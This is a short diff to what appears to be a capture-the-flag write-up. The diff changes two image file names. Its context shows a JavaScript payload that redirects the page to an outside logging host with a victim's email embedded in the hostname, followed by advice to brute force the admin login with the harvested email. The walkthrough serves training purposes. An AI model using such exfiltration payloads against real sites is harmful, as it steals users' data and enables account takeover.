@@ -120,13 +120,13 @@ document.location = "http://"+ email +".8ba7c46d7ea59d575b71ef3126651b6a.log.try
 ```
 Press Create ticket and check the results on the service http://10.10.10.100
 
-![](./assets/admin.png)
+![](./assets/admin1.png)
 
 We see the admin email and ours!
 
 Now we can brute force the login page for the admins password as we have his email now.
 
-![](./assets/flag.png)
+![](./assets/flag1.png)
 
 
 
